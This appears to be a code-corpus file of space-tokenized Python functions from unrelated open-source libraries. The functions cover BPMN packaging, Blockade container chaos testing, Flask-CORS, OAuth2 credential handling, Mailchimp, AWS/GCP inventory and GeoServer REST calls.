def package_for_editor_signavio ( self , spec , filename ) : signavio_file = filename [ : - len ( '.bpmn20.xml' ) ] + '.signavio.xml' if os . path . exists ( signavio_file ) : self . write_file_to_package_zip ( "src/" + self . _get_zip_path ( signavio_file ) , signavio_file ) f = open ( signavio_file , 'r' ) try : signavio_tree = ET . parse ( f ) finally : f . close ( ) svg_node = one ( signavio_tree . findall ( './/svg-representation' ) ) self . write_to_package_zip ( "%s.svg" % spec . name , svg_node . text )
def write_meta_data ( self ) : config = configparser . ConfigParser ( ) config . add_section ( 'MetaData' ) config . set ( 'MetaData' , 'entry_point_process' , self . wf_spec . name ) if self . editor : config . set ( 'MetaData' , 'editor' , self . editor ) for k , v in self . meta_data : config . set ( 'MetaData' , k , v ) if not self . PARSER_CLASS == BpmnParser : config . set ( 'MetaData' , 'parser_class_module' , inspect . getmodule ( self . PARSER_CLASS ) . __name__ ) config . set ( 'MetaData' , 'parser_class' , self . PARSER_CLASS . __name__ ) ini = StringIO ( ) config . write ( ini ) self . write_to_package_zip ( self . METADATA_FILE , ini . getvalue ( ) )
def add_main_options ( cls , parser ) : parser . add_option ( "-o" , "--output" , dest = "package_file" , help = "create the BPMN package in the specified file" ) parser . add_option ( "-p" , "--process" , dest = "entry_point_process" , help = "specify the entry point process" ) parser . add_option ( "-c" , "--config-file" , dest = "config_file" , help = "specify a config file to use" ) parser . add_option ( "-i" , "--initialise-config-file" , action = "store_true" , dest = "init_config_file" , default = False , help = "create a new config file from the specified options" ) group = OptionGroup ( parser , "BPMN Editor Options" , "These options are not required, but may be " " provided to activate special features of " "supported BPMN editors." ) group . add_option ( "--editor" , dest = "editor" , help = "editors with special support: signavio" ) parser . add_option_group ( group )
def add_additional_options ( cls , parser ) : group = OptionGroup ( parser , "Target Engine Options" , "These options are not required, but may be " "provided if a specific " "BPMN application engine is targeted." ) group . add_option ( "-e" , "--target-engine" , dest = "target_engine" , help = "target the specified BPMN application engine" ) group . add_option ( "-t" , "--target-version" , dest = "target_engine_version" , help = "target the specified version of the BPMN application engine" ) parser . add_option_group ( group )
def check_args ( cls , config , options , args , parser , package_file = None ) : if not args : parser . error ( "no input files specified" ) if not ( package_file or options . package_file ) : parser . error ( "no package file specified" ) if not options . entry_point_process : parser . error ( "no entry point process specified" )
def merge_options_and_config ( cls , config , options , args ) : if args : config . set ( CONFIG_SECTION_NAME , 'input_files' , ',' . join ( args ) ) elif config . has_option ( CONFIG_SECTION_NAME , 'input_files' ) : for i in config . get ( CONFIG_SECTION_NAME , 'input_files' ) . split ( ',' ) : if not os . path . isabs ( i ) : i = os . path . abspath ( os . path . join ( os . path . dirname ( options . config_file ) , i ) ) args . append ( i ) cls . merge_option_and_config_str ( 'package_file' , config , options ) cls . merge_option_and_config_str ( 'entry_point_process' , config , options ) cls . merge_option_and_config_str ( 'target_engine' , config , options ) cls . merge_option_and_config_str ( 'target_engine_version' , config , options ) cls . merge_option_and_config_str ( 'editor' , config , options )
def create_meta_data ( cls , options , args , parser ) : meta_data = [ ] meta_data . append ( ( 'spiff_version' , cls . get_version ( ) ) ) if options . target_engine : meta_data . append ( ( 'target_engine' , options . target_engine ) ) if options . target_engine : meta_data . append ( ( 'target_engine_version' , options . target_engine_version ) ) return meta_data
def _add_notify ( self , task_spec ) : if task_spec . name in self . task_specs : raise KeyError ( 'Duplicate task spec name: ' + task_spec . name ) self . task_specs [ task_spec . name ] = task_spec task_spec . id = len ( self . task_specs )
def get_ready_user_tasks ( self ) : return [ t for t in self . get_tasks ( Task . READY ) if not self . _is_engine_task ( t . task_spec ) ]
def deserialize ( cls , serializer , wf_spec , s_state , * * kwargs ) : return serializer . deserialize_trigger ( wf_spec , s_state , * * kwargs )
def execute ( self , task , script , * * kwargs ) : locals ( ) . update ( kwargs ) exec ( script )
def container_id ( self , name ) : container = self . _containers . get ( name , None ) if not container is None : return container . get ( 'id' , None ) return None
def update ( self , containers ) : self . _containers = deepcopy ( containers ) self . __write ( containers , initialize = False )
def load ( self ) : try : with open ( self . _state_file ) as f : state = yaml . safe_load ( f ) self . _containers = state [ 'containers' ] except ( IOError , OSError ) as err : if err . errno == errno . ENOENT : raise NotInitializedError ( "No blockade exists in this context" ) raise InconsistentStateError ( "Failed to load Blockade state: " + str ( err ) ) except Exception as err : raise InconsistentStateError ( "Failed to load Blockade state: " + str ( err ) )
def _get_blockade_id_from_cwd ( self , cwd = None ) : if not cwd : cwd = os . getcwd ( ) # this follows a similar pattern as docker-compose uses parent_dir = os . path . abspath ( cwd ) basename = os . path . basename ( parent_dir ) . lower ( ) blockade_id = re . sub ( r"[^a-z0-9]" , "" , basename ) if not blockade_id : # if we can't get a valid name from CWD, use "default" blockade_id = "default" return blockade_id
def _assure_dir ( self ) : try : os . makedirs ( self . _state_dir ) except OSError as err : if err . errno != errno . EEXIST : raise
def _state_delete ( self ) : try : os . remove ( self . _state_file ) except OSError as err : if err . errno not in ( errno . EPERM , errno . ENOENT ) : raise try : os . rmdir ( self . _state_dir ) except OSError as err : if err . errno not in ( errno . ENOTEMPTY , errno . ENOENT ) : raise
def __write ( self , containers , initialize = True ) : path = self . _state_file self . _assure_dir ( ) try : flags = os . O_WRONLY | os . O_CREAT if initialize : flags |= os . O_EXCL with os . fdopen ( os . open ( path , flags ) , "w" ) as f : yaml . safe_dump ( self . __base_state ( containers ) , f ) except OSError as err : if err . errno == errno . EEXIST : raise AlreadyInitializedError ( "Path %s exists. " "You may need to destroy a previous blockade." % path ) raise except Exception : # clean up our created file self . _state_delete ( ) raise
def insert_rule ( self , chain , src = None , dest = None , target = None ) : if not chain : raise ValueError ( "Invalid chain" ) if not target : raise ValueError ( "Invalid target" ) if not ( src or dest ) : raise ValueError ( "Need src, dest, or both" ) args = [ "-I" , chain ] if src : args += [ "-s" , src ] if dest : args += [ "-d" , dest ] args += [ "-j" , target ] self . call ( * args )
def _sm_start ( self , * args , * * kwargs ) : millisec = random . randint ( self . _start_min_delay , self . _start_max_delay ) self . _timer = threading . Timer ( millisec / 1000.0 , self . event_timeout ) self . _timer . start ( )
def _sm_to_pain ( self , * args , * * kwargs ) : _logger . info ( "Starting chaos for blockade %s" % self . _blockade_name ) self . _do_blockade_event ( ) # start the timer to end the pain millisec = random . randint ( self . _run_min_time , self . _run_max_time ) self . _timer = threading . Timer ( millisec / 1000.0 , self . event_timeout ) self . _timer . start ( )
def _sm_stop_from_no_pain ( self , * args , * * kwargs ) : # Just stop the timer.  It is possible that it was too late and the # timer is about to run _logger . info ( "Stopping chaos for blockade %s" % self . _blockade_name ) self . _timer . cancel ( )
def _sm_relieve_pain ( self , * args , * * kwargs ) : _logger . info ( "Ending the degradation for blockade %s" % self . _blockade_name ) self . _do_reset_all ( ) # set a timer for the next pain event millisec = random . randint ( self . _start_min_delay , self . _start_max_delay ) self . _timer = threading . Timer ( millisec / 1000.0 , self . event_timeout ) self . _timer . start ( )
def _sm_stop_from_pain ( self , * args , * * kwargs ) : _logger . info ( "Stopping chaos for blockade %s" % self . _blockade_name ) self . _do_reset_all ( )
def _sm_cleanup ( self , * args , * * kwargs ) : if self . _done_notification_func is not None : self . _done_notification_func ( ) self . _timer . cancel ( )
def cmd_up ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) containers = b . create ( verbose = opts . verbose , force = opts . force ) print_containers ( containers , opts . json )
def cmd_destroy ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) b . destroy ( )
def cmd_status ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) containers = b . status ( ) print_containers ( containers , opts . json )
def cmd_kill ( opts ) : kill_signal = opts . signal if hasattr ( opts , 'signal' ) else "SIGKILL" __with_containers ( opts , Blockade . kill , signal = kill_signal )
def cmd_join ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) b . join ( )
def cmd_logs ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) puts ( b . logs ( opts . container ) . decode ( encoding = 'UTF-8' ) )
def cmd_daemon ( opts ) : if opts . data_dir is None : raise BlockadeError ( "You must supply a data directory for the daemon" ) rest . start ( data_dir = opts . data_dir , port = opts . port , debug = opts . debug , host_exec = get_host_exec ( ) )
def cmd_add ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) b . add_container ( opts . containers )
def cmd_events ( opts ) : config = load_config ( opts . config ) b = get_blockade ( config , opts ) if opts . json : outf = None _write = puts if opts . output is not None : outf = open ( opts . output , "w" ) _write = outf . write try : delim = "" logs = b . get_audit ( ) . read_logs ( as_json = False ) _write ( '{"events": [' ) _write ( os . linesep ) for l in logs : _write ( delim + l ) delim = "," + os . linesep _write ( os . linesep ) _write ( ']}' ) finally : if opts . output is not None : outf . close ( ) else : puts ( colored . blue ( columns ( [ "EVENT" , 10 ] , [ "TARGET" , 16 ] , [ "STATUS" , 8 ] , [ "TIME" , 16 ] , [ "MESSAGE" , 25 ] ) ) ) logs = b . get_audit ( ) . read_logs ( as_json = True ) for l in logs : puts ( columns ( [ l [ 'event' ] , 10 ] , [ str ( [ str ( t ) for t in l [ 'targets' ] ] ) , 16 ] , [ l [ 'status' ] , 8 ] , [ str ( l [ 'timestamp' ] ) , 16 ] , [ l [ 'message' ] , 25 ] ) )
def try_match ( request_origin , maybe_regex ) : if isinstance ( maybe_regex , RegexObject ) : return re . match ( maybe_regex , request_origin ) elif probably_regex ( maybe_regex ) : return re . match ( maybe_regex , request_origin , flags = re . IGNORECASE ) else : try : return request_origin . lower ( ) == maybe_regex . lower ( ) except AttributeError : return request_origin == maybe_regex
def get_app_kwarg_dict ( appInstance = None ) : app = ( appInstance or current_app ) # In order to support blueprints which do not have a config attribute app_config = getattr ( app , 'config' , { } ) return { k . lower ( ) . replace ( 'cors_' , '' ) : app_config . get ( k ) for k in CONFIG_OPTIONS if app_config . get ( k ) is not None }
def ensure_iterable ( inst ) : if isinstance ( inst , string_types ) : return [ inst ] elif not isinstance ( inst , collections . Iterable ) : return [ inst ] else : return inst
def serialize_options ( opts ) : options = ( opts or { } ) . copy ( ) for key in opts . keys ( ) : if key not in DEFAULT_OPTIONS : LOG . warning ( "Unknown option passed to Flask-CORS: %s" , key ) # Ensure origins is a list of allowed origins with at least one entry. options [ 'origins' ] = sanitize_regex_param ( options . get ( 'origins' ) ) options [ 'allow_headers' ] = sanitize_regex_param ( options . get ( 'allow_headers' ) ) # This is expressly forbidden by the spec. Raise a value error so people # don't get burned in production. if r'.*' in options [ 'origins' ] and options [ 'supports_credentials' ] and options [ 'send_wildcard' ] : raise ValueError ( "Cannot use supports_credentials in conjunction with" "an origin string of '*'. See: " "http://www.w3.org/TR/cors/#resource-requests" ) serialize_option ( options , 'expose_headers' ) serialize_option ( options , 'methods' , upper = True ) if isinstance ( options . get ( 'max_age' ) , timedelta ) : options [ 'max_age' ] = str ( int ( options [ 'max_age' ] . total_seconds ( ) ) ) return options
def _getJson ( url , token = '' , version = '' ) : if token : return _getJsonIEXCloud ( url , token , version ) return _getJsonOrig ( url )
def bulkMinuteBars ( symbol , dates , token = '' , version = '' ) : _raiseIfNotStr ( symbol ) dates = [ _strOrDate ( date ) for date in dates ] list_orig = dates . __class__ args = [ ] for date in dates : args . append ( ( symbol , '1d' , date , token , version ) ) pool = ThreadPool ( 20 ) rets = pool . starmap ( chart , args ) pool . close ( ) return list_orig ( itertools . chain ( * rets ) )
def bulkMinuteBarsDF ( symbol , dates , token = '' , version = '' ) : data = bulkMinuteBars ( symbol , dates , token , version ) df = pd . DataFrame ( data ) if df . empty : return df _toDatetime ( df ) df . set_index ( [ 'date' , 'minute' ] , inplace = True ) return df
def start ( self ) : if self . extra_args : sys . exit ( '{} takes no extra arguments' . format ( self . name ) ) else : if self . _toggle_value : nbextensions . install_nbextension_python ( _pkg_name , overwrite = True , symlink = False , user = self . user , sys_prefix = self . sys_prefix , prefix = None , nbextensions_dir = None , logger = None ) else : nbextensions . uninstall_nbextension_python ( _pkg_name , user = self . user , sys_prefix = self . sys_prefix , prefix = None , nbextensions_dir = None , logger = None ) self . toggle_nbextension_python ( _pkg_name ) self . toggle_server_extension_python ( _pkg_name )
def start ( self ) : super ( JupyterTensorboardApp , self ) . start ( ) subcmds = ", " . join ( sorted ( self . subcommands ) ) sys . exit ( "Please supply at least one subcommand: %s" % subcmds )
def _credentials_from_request ( request ) : # ORM storage requires a logged in user if ( oauth2_settings . storage_model is None or request . user . is_authenticated ( ) ) : return get_storage ( request ) . get ( ) else : return None
def locked_delete ( self ) : filters = { self . key_name : self . key_value } self . session . query ( self . model_class ) . filter_by ( * * filters ) . delete ( )
def _generate_assertion ( self ) : now = int ( time . time ( ) ) payload = { 'aud' : self . token_uri , 'scope' : self . _scopes , 'iat' : now , 'exp' : now + self . MAX_TOKEN_LIFETIME_SECS , 'iss' : self . _service_account_email , } payload . update ( self . _kwargs ) return crypt . make_signed_jwt ( self . _signer , payload , key_id = self . _private_key_id )
def _get_well_known_file ( ) : # TODO(orestica): Revisit this method once gcloud provides a better way # of pinpointing the exact location of the file. default_config_dir = os . getenv ( _CLOUDSDK_CONFIG_ENV_VAR ) if default_config_dir is None : if os . name == 'nt' : try : default_config_dir = os . path . join ( os . environ [ 'APPDATA' ] , _CLOUDSDK_CONFIG_DIRECTORY ) except KeyError : # This should never happen unless someone is really # messing with things. drive = os . environ . get ( 'SystemDrive' , 'C:' ) default_config_dir = os . path . join ( drive , '\\' , _CLOUDSDK_CONFIG_DIRECTORY ) else : default_config_dir = os . path . join ( os . path . expanduser ( '~' ) , '.config' , _CLOUDSDK_CONFIG_DIRECTORY ) return os . path . join ( default_config_dir , _WELL_KNOWN_CREDENTIALS_FILE )
def _get_application_default_credential_from_file ( filename ) : # read the credentials from the file with open ( filename ) as file_obj : client_credentials = json . load ( file_obj ) credentials_type = client_credentials . get ( 'type' ) if credentials_type == AUTHORIZED_USER : required_fields = set ( [ 'client_id' , 'client_secret' , 'refresh_token' ] ) elif credentials_type == SERVICE_ACCOUNT : required_fields = set ( [ 'client_id' , 'client_email' , 'private_key_id' , 'private_key' ] ) else : raise ApplicationDefaultCredentialsError ( "'type' field should be defined (and have one of the '" + AUTHORIZED_USER + "' or '" + SERVICE_ACCOUNT + "' values)" ) missing_fields = required_fields . difference ( client_credentials . keys ( ) ) if missing_fields : _raise_exception_for_missing_fields ( missing_fields ) if client_credentials [ 'type' ] == AUTHORIZED_USER : return GoogleCredentials ( access_token = None , client_id = client_credentials [ 'client_id' ] , client_secret = client_credentials [ 'client_secret' ] , refresh_token = client_credentials [ 'refresh_token' ] , token_expiry = None , token_uri = oauth2client . GOOGLE_TOKEN_URI , user_agent = 'Python client library' ) else : # client_credentials['type'] == SERVICE_ACCOUNT from oauth2client import service_account return service_account . _JWTAccessCredentials . from_json_keyfile_dict ( client_credentials )
def _oauth2_web_server_flow_params ( kwargs ) : params = { 'access_type' : 'offline' , 'response_type' : 'code' , } params . update ( kwargs ) # Check for the presence of the deprecated approval_prompt param and # warn appropriately. approval_prompt = params . get ( 'approval_prompt' ) if approval_prompt is not None : logger . warning ( 'The approval_prompt parameter for OAuth2WebServerFlow is ' 'deprecated. Please use the prompt parameter instead.' ) if approval_prompt == 'force' : logger . warning ( 'approval_prompt="force" has been adjusted to ' 'prompt="consent"' ) params [ 'prompt' ] = 'consent' del params [ 'approval_prompt' ] return params
def _generate_refresh_request_body ( self ) : body = urllib . parse . urlencode ( { 'grant_type' : 'refresh_token' , 'client_id' : self . client_id , 'client_secret' : self . client_secret , 'refresh_token' : self . refresh_token , } ) return body
def _load_client_secrets ( self , filename ) : client_type , client_info = clientsecrets . loadfile ( filename ) if client_type != clientsecrets . TYPE_WEB : raise ValueError ( 'The flow specified in {0} is not supported.' . format ( client_type ) ) self . client_id = client_info [ 'client_id' ] self . client_secret = client_info [ 'client_secret' ]
def _make_flow ( self , return_url = None , * * kwargs ) : # Generate a CSRF token to prevent malicious requests. csrf_token = hashlib . sha256 ( os . urandom ( 1024 ) ) . hexdigest ( ) session [ _CSRF_KEY ] = csrf_token state = json . dumps ( { 'csrf_token' : csrf_token , 'return_url' : return_url } ) kw = self . flow_kwargs . copy ( ) kw . update ( kwargs ) extra_scopes = kw . pop ( 'scopes' , [ ] ) scopes = set ( self . scopes ) . union ( set ( extra_scopes ) ) flow = client . OAuth2WebServerFlow ( client_id = self . client_id , client_secret = self . client_secret , scope = scopes , state = state , redirect_uri = url_for ( 'oauth2.callback' , _external = True ) , * * kw ) flow_key = _FLOW_KEY . format ( csrf_token ) session [ flow_key ] = pickle . dumps ( flow ) return flow
def credentials ( self ) : ctx = _app_ctx_stack . top if not hasattr ( ctx , _CREDENTIALS_KEY ) : ctx . google_oauth2_credentials = self . storage . get ( ) return ctx . google_oauth2_credentials
def has_credentials ( self ) : if not self . credentials : return False # Is the access token expired? If so, do we have an refresh token? elif ( self . credentials . access_token_expired and not self . credentials . refresh_token ) : return False else : return True
def locked_delete ( self ) : if self . _cache : self . _cache . delete ( self . _key_name ) self . _delete_entity ( )
def _SendRecv ( ) : port = int ( os . getenv ( DEVSHELL_ENV , 0 ) ) if port == 0 : raise NoDevshellServer ( ) sock = socket . socket ( ) sock . connect ( ( 'localhost' , port ) ) data = CREDENTIAL_INFO_REQUEST_JSON msg = '{0}\n{1}' . format ( len ( data ) , data ) sock . sendall ( _helpers . _to_bytes ( msg , encoding = 'utf-8' ) ) header = sock . recv ( 6 ) . decode ( ) if '\n' not in header : raise CommunicationError ( 'saw no newline in the first 6 bytes' ) len_str , json_str = header . split ( '\n' , 1 ) to_read = int ( len_str ) - len ( json_str ) if to_read > 0 : json_str += sock . recv ( to_read , socket . MSG_WAITALL ) . decode ( ) return CredentialInfoResponse ( json_str )
def locked_delete ( self ) : query = { self . key_name : self . key_value } self . model_class . objects . filter ( * * query ) . delete ( )
def all ( self , list_id , * * queryparams ) : return self . _mc_client . _get ( url = self . _build_path ( list_id , 'segments' ) , * * queryparams )
def get ( self , list_id , segment_id ) : return self . _mc_client . _get ( url = self . _build_path ( list_id , 'segments' , segment_id ) )
def update ( self , list_id , segment_id , data ) : return self . _mc_client . _patch ( url = self . _build_path ( list_id , 'segments' , segment_id ) , data = data )
def delete ( self , list_id , segment_id ) : return self . _mc_client . _delete ( url = self . _build_path ( list_id , 'segments' , segment_id ) )
def create ( self , list_id , data ) : return self . _mc_client . _post ( url = self . _build_path ( list_id , 'segments' ) , data = data )
def get_metadata ( self ) : try : r = requests . get ( 'https://login.mailchimp.com/oauth2/metadata' , auth = self ) except requests . exceptions . RequestException as e : raise e else : r . raise_for_status ( ) output = r . json ( ) if 'error' in output : raise requests . exceptions . RequestException ( output [ 'error' ] ) return output
def get_access_details ( self , key = None ) : if key in self . _CACHE_STATS : return self . _CACHE_STATS [ 'access_stats' ] [ key ] else : return self . _CACHE_STATS [ 'access_stats' ]
def get_stats ( self ) : expired = sum ( [ x [ 'expired' ] for _ , x in self . _CACHE_STATS [ 'access_stats' ] . items ( ) ] ) miss = sum ( [ x [ 'miss' ] for _ , x in self . _CACHE_STATS [ 'access_stats' ] . items ( ) ] ) hit = sum ( [ x [ 'hit' ] for _ , x in self . _CACHE_STATS [ 'access_stats' ] . items ( ) ] ) return { 'totals' : { 'keys' : len ( self . _CACHE_STATS [ 'access_stats' ] ) , 'expired' : expired , 'miss' : miss , 'hit' : hit , } }
def get_vpc_flow_logs ( vpc , * * conn ) : fl_result = describe_flow_logs ( Filters = [ { "Name" : "resource-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) fl_ids = [ ] for fl in fl_result : fl_ids . append ( fl [ "FlowLogId" ] ) return fl_ids
def get_classic_link ( vpc , * * conn ) : result = { } try : cl_result = describe_vpc_classic_link ( VpcIds = [ vpc [ "id" ] ] , * * conn ) [ 0 ] result [ "Enabled" ] = cl_result [ "ClassicLinkEnabled" ] # Check for DNS as well: dns_result = describe_vpc_classic_link_dns_support ( VpcIds = [ vpc [ "id" ] ] , * * conn ) [ 0 ] result [ "DnsEnabled" ] = dns_result [ "ClassicLinkDnsSupported" ] except ClientError as e : # This is not supported for all regions. if 'UnsupportedOperation' not in str ( e ) : raise e return result
def get_internet_gateway ( vpc , * * conn ) : result = { } ig_result = describe_internet_gateways ( Filters = [ { "Name" : "attachment.vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) if ig_result : # Only 1 IG can be attached to a VPC: result . update ( { "State" : ig_result [ 0 ] [ "Attachments" ] [ 0 ] [ "State" ] , "Id" : ig_result [ 0 ] [ "InternetGatewayId" ] , "Tags" : ig_result [ 0 ] . get ( "Tags" , [ ] ) } ) return result
def get_vpc_peering_connections ( vpc , * * conn ) : accepter_result = describe_vpc_peering_connections ( Filters = [ { "Name" : "accepter-vpc-info.vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) requester_result = describe_vpc_peering_connections ( Filters = [ { "Name" : "requester-vpc-info.vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) # Assuming that there will be no duplicates: peer_ids = [ ] for peering in accepter_result + requester_result : peer_ids . append ( peering [ "VpcPeeringConnectionId" ] ) return peer_ids
def get_subnets ( vpc , * * conn ) : subnets = describe_subnets ( Filters = [ { "Name" : "vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) s_ids = [ ] for s in subnets : s_ids . append ( s [ "SubnetId" ] ) return s_ids
def get_route_tables ( vpc , * * conn ) : route_tables = describe_route_tables ( Filters = [ { "Name" : "vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) rt_ids = [ ] for r in route_tables : rt_ids . append ( r [ "RouteTableId" ] ) return rt_ids
def get_network_acls ( vpc , * * conn ) : route_tables = describe_network_acls ( Filters = [ { "Name" : "vpc-id" , "Values" : [ vpc [ "id" ] ] } ] , * * conn ) nacl_ids = [ ] for r in route_tables : nacl_ids . append ( r [ "NetworkAclId" ] ) return nacl_ids
def get_gcp_client ( * * kwargs ) : return _gcp_client ( project = kwargs [ 'project' ] , mod_name = kwargs [ 'mod_name' ] , pkg_name = kwargs . get ( 'pkg_name' , 'google.cloud' ) , key_file = kwargs . get ( 'key_file' , None ) , http_auth = kwargs . get ( 'http' , None ) , user_agent = kwargs . get ( 'user_agent' , None ) )
def get_creds_from_kwargs ( kwargs ) : creds = { 'key_file' : kwargs . pop ( 'key_file' , None ) , 'http_auth' : kwargs . pop ( 'http_auth' , None ) , 'project' : kwargs . get ( 'project' , None ) , 'user_agent' : kwargs . pop ( 'user_agent' , None ) , 'api_version' : kwargs . pop ( 'api_version' , 'v1' ) } return ( creds , kwargs )
def gce_list_aggregated ( service = None , key_name = 'name' , * * kwargs ) : resp_list = [ ] req = service . aggregatedList ( * * kwargs ) while req is not None : resp = req . execute ( ) for location , item in resp [ 'items' ] . items ( ) : if key_name in item : resp_list . extend ( item [ key_name ] ) req = service . aggregatedList_next ( previous_request = req , previous_response = resp ) return resp_list
def gce_list ( service = None , * * kwargs ) : resp_list = [ ] req = service . list ( * * kwargs ) while req is not None : resp = req . execute ( ) for item in resp . get ( 'items' , [ ] ) : resp_list . append ( item ) req = service . list_next ( previous_request = req , previous_response = resp ) return resp_list
def service_list ( service = None , key_name = None , * * kwargs ) : resp_list = [ ] req = service . list ( * * kwargs ) while req is not None : resp = req . execute ( ) if key_name and key_name in resp : resp_list . extend ( resp [ key_name ] ) else : resp_list . append ( resp ) # Not all list calls have a list_next if hasattr ( service , 'list_next' ) : req = service . list_next ( previous_request = req , previous_response = resp ) else : req = None return resp_list
def get_cache_access_details ( key = None ) : from cloudaux . gcp . decorators import _GCP_CACHE return _GCP_CACHE . get_access_details ( key = key )
def get_role_managed_policy_documents ( role , client = None , * * kwargs ) : policies = get_role_managed_policies ( role , force_client = client ) policy_names = ( policy [ 'name' ] for policy in policies ) delayed_gmpd_calls = ( delayed ( get_managed_policy_document ) ( policy [ 'arn' ] , force_client = client ) for policy in policies ) policy_documents = Parallel ( n_jobs = 20 , backend = "threading" ) ( delayed_gmpd_calls ) return dict ( zip ( policy_names , policy_documents ) )
def get_group_policy_document ( group_name , policy_name , client = None , * * kwargs ) : return client . get_group_policy ( GroupName = group_name , PolicyName = policy_name , * * kwargs ) [ 'PolicyDocument' ]
def _get_base ( server_certificate , * * conn ) : server_certificate [ '_version' ] = 1 # Get the initial cert details: cert_details = get_server_certificate_api ( server_certificate [ 'ServerCertificateName' ] , * * conn ) if cert_details : server_certificate . update ( cert_details [ 'ServerCertificateMetadata' ] ) server_certificate [ 'CertificateBody' ] = cert_details [ 'CertificateBody' ] server_certificate [ 'CertificateChain' ] = cert_details . get ( 'CertificateChain' , None ) # Cast dates from a datetime to something JSON serializable. server_certificate [ 'UploadDate' ] = get_iso_string ( server_certificate [ 'UploadDate' ] ) server_certificate [ 'Expiration' ] = get_iso_string ( server_certificate [ 'Expiration' ] ) return server_certificate
def get_security_group ( security_group , flags = FLAGS . ALL , * * kwargs ) : result = registry . build_out ( flags , start_with = security_group , pass_datastructure = True , * * kwargs ) result . pop ( 'security_group_rules' , [ ] ) return result
def get_inline_policies ( group , * * conn ) : policy_list = list_group_policies ( group [ 'GroupName' ] ) policy_documents = { } for policy in policy_list : policy_documents [ policy ] = get_group_policy_document ( group [ 'GroupName' ] , policy , * * conn ) return policy_documents
def get_managed_policies ( group , * * conn ) : managed_policies = list_attached_group_managed_policies ( group [ 'GroupName' ] , * * conn ) managed_policy_names = [ ] for policy in managed_policies : managed_policy_names . append ( policy [ 'PolicyName' ] ) return managed_policy_names
def get_users ( group , * * conn ) : group_details = get_group_api ( group [ 'GroupName' ] , * * conn ) user_list = [ ] for user in group_details . get ( 'Users' , [ ] ) : user_list . append ( user [ 'UserName' ] ) return user_list
def _get_base ( group , * * conn ) : group [ '_version' ] = 1 # Get the initial group details (only needed if we didn't grab the users): group . update ( get_group_api ( group [ 'GroupName' ] , users = False , * * conn ) [ 'Group' ] ) # Cast CreateDate from a datetime to something JSON serializable. group [ 'CreateDate' ] = get_iso_string ( group [ 'CreateDate' ] ) return group
def get_short_version ( self ) : gs_version = self . get_version ( ) match = re . compile ( r'[^\d.]+' ) return match . sub ( '' , gs_version ) . strip ( '.' )
def delete_granule ( self , coverage , store , granule_id , workspace = None ) : params = dict ( ) workspace_name = workspace if isinstance ( store , basestring ) : store_name = store else : store_name = store . name workspace_name = store . workspace . name if workspace_name is None : raise ValueError ( "Must specify workspace" ) url = build_url ( self . service_url , [ "workspaces" , workspace_name , "coveragestores" , store_name , "coverages" , coverage , "index/granules" , granule_id , ".json" ] , params ) # DELETE /workspaces/<ws>/coveragestores/<name>/coverages/<coverage>/index/granules/<granule_id>.json headers = { "Content-type" : "application/json" , "Accept" : "application/json" } resp = self . http_request ( url , method = 'delete' , headers = headers ) if resp . status_code != 200 : FailedRequestError ( 'Failed to delete granule from mosaic {} : {}, {}' . format ( store , resp . status_code , resp . text ) ) self . _cache . clear ( ) # maybe return a list of all granules? return None
def list_granules ( self , coverage , store , workspace = None , filter = None , limit = None , offset = None ) : params = dict ( ) if filter is not None : params [ 'filter' ] = filter if limit is not None : params [ 'limit' ] = limit if offset is not None : params [ 'offset' ] = offset workspace_name = workspace if isinstance ( store , basestring ) : store_name = store else : store_name = store . name workspace_name = store . workspace . name if workspace_name is None : raise ValueError ( "Must specify workspace" ) url = build_url ( self . service_url , [ "workspaces" , workspace_name , "coveragestores" , store_name , "coverages" , coverage , "index/granules.json" ] , params ) # GET /workspaces/<ws>/coveragestores/<name>/coverages/<coverage>/index/granules.json headers = { "Content-type" : "application/json" , "Accept" : "application/json" } resp = self . http_request ( url , headers = headers ) if resp . status_code != 200 : FailedRequestError ( 'Failed to list granules in mosaic {} : {}, {}' . format ( store , resp . status_code , resp . text ) ) self . _cache . clear ( ) return resp . json ( )
def mosaic_coverages ( self , store ) : params = dict ( ) url = build_url ( self . service_url , [ "workspaces" , store . workspace . name , "coveragestores" , store . name , "coverages.json" ] , params ) # GET /workspaces/<ws>/coveragestores/<name>/coverages.json headers = { "Content-type" : "application/json" , "Accept" : "application/json" } resp = self . http_request ( url , headers = headers ) if resp . status_code != 200 : FailedRequestError ( 'Failed to get mosaic coverages {} : {}, {}' . format ( store , resp . status_code , resp . text ) ) self . _cache . clear ( ) return resp . json ( )
def publish_featuretype ( self , name , store , native_crs , srs = None , jdbc_virtual_table = None , native_name = None ) : # @todo native_srs doesn't seem to get detected, even when in the DB # metadata (at least for postgis in geometry_columns) and then there # will be a misconfigured layer if native_crs is None : raise ValueError ( "must specify native_crs" ) srs = srs or native_crs feature_type = FeatureType ( self , store . workspace , store , name ) # because name is the in FeatureType base class, work around that # and hack in these others that don't have xml properties feature_type . dirty [ 'name' ] = name feature_type . dirty [ 'srs' ] = srs feature_type . dirty [ 'nativeCRS' ] = native_crs feature_type . enabled = True feature_type . advertised = True feature_type . title = name if native_name is not None : feature_type . native_name = native_name headers = { "Content-type" : "application/xml" , "Accept" : "application/xml" } resource_url = store . resource_url if jdbc_virtual_table is not None : feature_type . metadata = ( { 'JDBC_VIRTUAL_TABLE' : jdbc_virtual_table } ) params = dict ( ) resource_url = build_url ( self . service_url , [ "workspaces" , store . workspace . name , "datastores" , store . name , "featuretypes.xml" ] , params ) resp = self . http_request ( resource_url , method = 'post' , data = feature_type . message ( ) , headers = headers ) if resp . status_code not in ( 200 , 201 , 202 ) : FailedRequestError ( 'Failed to publish feature type {} : {}, {}' . format ( name , resp . status_code , resp . text ) ) self . _cache . clear ( ) feature_type . fetch ( ) return feature_type
def md_link ( node ) : mimetype = node . find ( "type" ) mdtype = node . find ( "metadataType" ) content = node . find ( "content" ) if None in [ mimetype , mdtype , content ] : return None else : return ( mimetype . text , mdtype . text , content . text )
